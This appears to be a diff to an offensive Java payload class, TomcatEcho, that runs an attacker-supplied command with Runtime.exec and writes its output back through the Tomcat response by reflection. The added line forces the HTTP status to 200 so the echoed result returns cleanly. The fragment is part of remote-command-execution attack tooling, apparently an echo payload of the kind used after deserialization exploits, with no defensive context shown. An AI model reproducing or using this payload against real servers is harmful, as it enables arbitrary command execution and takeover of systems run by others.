@@ -69,6 +69,7 @@ public class TomcatEcho {
                         }
                         String result = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
                         // doWrite
+                        response.getClass().getMethod("setStatus", Integer.TYPE).invoke(response, 200);
                         try {
                             response.getClass().getDeclaredMethod("doWrite", java.nio.ByteBuffer.class).invoke(response, java.nio.ByteBuffer.wrap(result.getBytes()));
                         } catch (NoSuchMethodException e) {
